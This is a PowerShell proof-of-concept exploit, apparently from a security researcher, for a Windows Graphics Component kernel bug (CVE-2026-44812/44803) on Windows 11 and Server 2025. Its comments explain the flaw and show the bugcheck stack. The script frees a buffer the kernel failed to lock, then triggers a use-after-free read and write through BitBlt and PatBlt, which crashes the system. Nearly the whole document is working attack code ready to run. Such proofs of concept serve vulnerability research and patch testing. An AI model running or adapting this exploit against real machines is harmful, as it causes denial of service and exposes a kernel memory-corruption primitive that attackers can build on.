# CVE-2026-44812 or CVE-2026-44803 Windows Graphics Component - WILL BSOD.
# Tested on Windows 11 25H2 and Windows Server 2025 24H2
# Fixed in June 2026
# @w3bd3vil ( https://krashconsulting.com )

# Even inside powershell run as "powershell.exe .\D3DKMT.ps1" forces Win32k/GDI process cleanup

# size-0 secure (Pitch=0) => MmSecureVirtualMemory(buf,0) returns non-NULL but LOCKS NOTHING.
# So we free buf, then force the kernel to touch the surface bits (now unmapped) => UAF -> bugcheck.

# nt!KeBugCheckEx(0x1A, 0x15000, startVA, secureEntry)
# nt!MiObtainReferencedSecureVad+0x155
# nt!MmUnsecureVirtualMemory+0x36
# win32kbase!SURFACE::bDeleteSurface+0x9c7
# win32kbase!vGarbageCollectObject<SURFREFGC> → vGarbageCollectObjects → GrepCloseCurrentProcess
# win32kbase!GdiProcessCallout → win32kfull!W32pProcessCallout → nt!PspExitThread

# win32kfull!GreGetBitmapBitsSize → noOverflowCJSCAN(width, planes, bitcount, height):
# rowbytes = ((bitcount * planes * (u64)width + 31) >> 3) & ~3;
# if (rowbytes > 0xFFFFFFFF) return 0;
# total = height * rowbytes;
# if (total > 0xFFFFFFFF) return 0;     // <-- attacker-controlled product wraps -> returns 0
# return (u32)total;
# A crafted BITMAPINFO (e.g., biWidth=0x10000, biHeight=0x10000, biBitCount=32) yields rowbytes=0x40000, total=0x400000000 > 0xFFFFFFFF → size 0.

param([int]$Width = 0x100, [int]$Height = 0x100)

$sig = @"
using System;
using System.Runtime.InteropServices;
public static class N {
  [DllImport("gdi32.dll")] public static extern int  D3DKMTCreateDCFromMemory(IntPtr arg);
  [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h);
  [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
  [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc,int w,int h);
  [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc,IntPtr o);
  [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,uint rop);
  [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc,int x,int y,int w,int h,uint rop);
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
  [DllImport("kernel32.dll")] public static extern bool VirtualFree(IntPtr a, UIntPtr s, uint t);
}
"@
Add-Type -TypeDefinition $sig

$buf    = [N]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]::op_Explicit(0x10000),0x3000,0x04)
$screen = [N]::GetDC([IntPtr]::Zero)
"buf=0x{0:X}" -f [int64]$buf

$st = [Runtime.InteropServices.Marshal]::AllocHGlobal(56)
0..55 | ForEach-Object { [Runtime.InteropServices.Marshal]::WriteByte($st,$_,0) }
[Runtime.InteropServices.Marshal]::WriteIntPtr($st, 0, $buf)
[Runtime.InteropServices.Marshal]::WriteInt32($st, 8, 21)
[Runtime.InteropServices.Marshal]::WriteInt32($st, 12, $Width)
[Runtime.InteropServices.Marshal]::WriteInt32($st, 16, $Height)
[Runtime.InteropServices.Marshal]::WriteInt32($st, 20, 0)          # Pitch=0 => secured 0 => buf NOT locked
[Runtime.InteropServices.Marshal]::WriteIntPtr($st, 24, $screen)
$rc  = [N]::D3DKMTCreateDCFromMemory($st)
$hdc = [Runtime.InteropServices.Marshal]::ReadIntPtr($st,40)
"rc=0x{0:X8} memDC=0x{1:X}" -f $rc,[int64]$hdc
if ($hdc -eq [IntPtr]::Zero) { "create failed"; return }

"freeing buf (kernel didn't lock it - secured 0)..."
[void][N]::VirtualFree($buf,[UIntPtr]::Zero,0x8000)   # MEM_RELEASE -> buf VA now unmapped

# force kernel to read the surface bits (freed buf): blt FROM memDC
$dst  = [N]::CreateCompatibleDC($screen)
$dbm  = [N]::CreateCompatibleBitmap($screen,$Width,$Height)
[void][N]::SelectObject($dst,$dbm)
"BitBlt FROM freed surface -> UAF read..."
[void][N]::BitBlt($dst,0,0,$Width,$Height,$hdc,0,0,0x00CC0020)  # SRCCOPY
"survived BitBlt; trying PatBlt TO freed surface (UAF write)..."
[void][N]::PatBlt($hdc,0,0,$Width,$Height,0x42)
"*** survived both"
